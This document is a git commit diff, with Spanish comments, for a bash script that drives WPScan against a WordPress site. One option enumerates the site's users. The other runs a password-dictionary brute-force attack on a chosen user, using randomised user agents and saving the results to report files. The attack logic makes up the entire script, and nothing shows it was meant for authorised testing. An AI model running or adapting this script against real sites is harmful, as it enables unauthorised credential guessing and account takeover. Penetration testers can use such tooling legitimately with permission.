1f401b6118a5bb3dcd398ccef6bb2361cfc7e022
Juan David Garcia <juandavid.garcia88@gmail.com>
2023-02-09 06:55:48 -0500

    Se empieza a probar funcionalidad para elegir diccionarios de passwords para el ataque al usuario seleccionado

--- full-wpscan.sh
+++ full-wpscan.sh
@@ -2,7 +2,8 @@
 url=""
 user=""
 opt=0
-.secrets/ ./secrets.sh
+token=$(awk -F'"' '/^wpscan_token=/ {print $2}' .secrets/secrets.sh )
+dics=$(awk -F'"' '/^dicsdispo=/ {print $2}' .secrets/dics/listar-dics.sh )
 
 while :
 do
@@ -27,23 +28,55 @@ do
     
     #validar opcion ingresada
     case $opt in
-        1) echo "\nEscaneo general"
+        1) echo "\nESCANEO GENERAL"
 		   echo "Se escaneara sitio web $url"
-		   echo "Escaneo iniciado: $(date +%d-%b - %H-%M)" 
+		   echo "Escaneo iniciado: $(date +%d_%b_%H_%M)"
+		   echo "-----------------------------------------"
+		   echo "Verificando directorio de informes"
+		   DIR=informes
+			if [ -d "$DIR" ];
+			then
+			    echo "Carpeta de informes ya existe. Accediendo a carpeta"
+			    cd informes/
+			    echo "Iniciando ataque. Por favor espere a que el proceso termine. Se generara un archivo .txt con el resultado de la operacion en $DIR"
+			else
+				echo "Carpeta de informes no existe. Creando carpeta $DIR ."
+			    mkdir informes/
+			    chmod 766 informes/
+			    cd informes/
+			    echo "Iniciando ataque. Por favor espere a que el proceso termine. Se generara un archivo .txt con el resultado de la operacion en $DIR"
+			fi
+		   echo "-----------------------------------------"
 		   while :;do for s in / - \\ \|; do printf "\r$s";sleep 1;done;done &
-		   wpscan --url $url -e u --api-token $wpscan_token --random-user-agent -v > informe-$url-$(date +%d-%b-%H_%M).txt
-		   kill $!; trap 'kill $!' SIGTERM
-		   echo "Escaneo finalizado el $(date +%d-%b-%H_%M) y guardado como informe-$url-$user-$(date +%d-%b_%H-%M).txt"
+		   wpscan --url $url -e u --api-token $token --random-user-agent -v > informe-$url-$(date +%d_%b_%H_%M).txt
+		   kill $!; trap 'kill $!' INT TERM
+		   echo "Escaneo finalizado el $(date +%d-%b-%H_%M) y guardado como informe-$url-$user-$(date +%d_%b_%H_%M).txt"
            sleep 10
            exit 0
            ;;
-        2) echo "\nAtacar usuario"
+        2) echo "\nATACAR USUARIO"
 		   read -p "Ingrese el usuario a atacar > " user
 		   echo "Se escaneara sitio web $url y atacara al usuario $user"
-		   echo "Ataque iniciado: $(date +%d-%b - %H-%M)" 
+		   echo "Ataque iniciado: $(date +%d_%b_%H-%M)" 
+		   echo "-----------------------------------------"
+		   echo "Verificando directorio de informes"
+		   DIR=informes
+			if [ -d "$DIR" ];
+			then
+			    echo "Carpeta de informes ya existe. Accediendo a carpeta"
+			    cd informes/
+			    echo "Iniciando ataque. Por favor espere a que el proceso termine. Se generara un archivo .txt con el resultado de la operacion en $DIR"
+			else
+				echo "Carpeta de informes no existe. Creando carpeta $DIR ."
+			    mkdir informes/
+			    chmod 766 informes/
+			    cd informes/
+			    echo "Iniciando ataque. Por favor espere a que el proceso termine. Se generara un archivo .txt con el resultado de la operacion en $DIR"
+			fi
+		   echo "-----------------------------------------"
 		   while :;do for s in / - \\ \|; do printf "\r$s";sleep 1;done;done &
-		   wpscan --url $url --passwords .secrets/dics/*.txt --usernames $user --api-token $wpscan_token --random-user-agent -v > informe-$url-$user-$(date +%d-%b-%H_%M).txt
-		   kill $!; trap 'kill $!' SIGTERM
+		   wpscan --url $url --passwords ../.secrets/dics/pw1.txt --usernames $user --api-token $token --random-user-agent -v > informe-$url-$user-$(date +%d_%b_%H_%M).txt
+		   kill $!; trap 'kill $!' INT TERM
 		   echo "Escaneo finalizado el $(date +%d-%b-%H_%M) y guardado como informe-$url-$user-$(date +%d-%b_%H-%M).txt"
            sleep 10
            exit 0
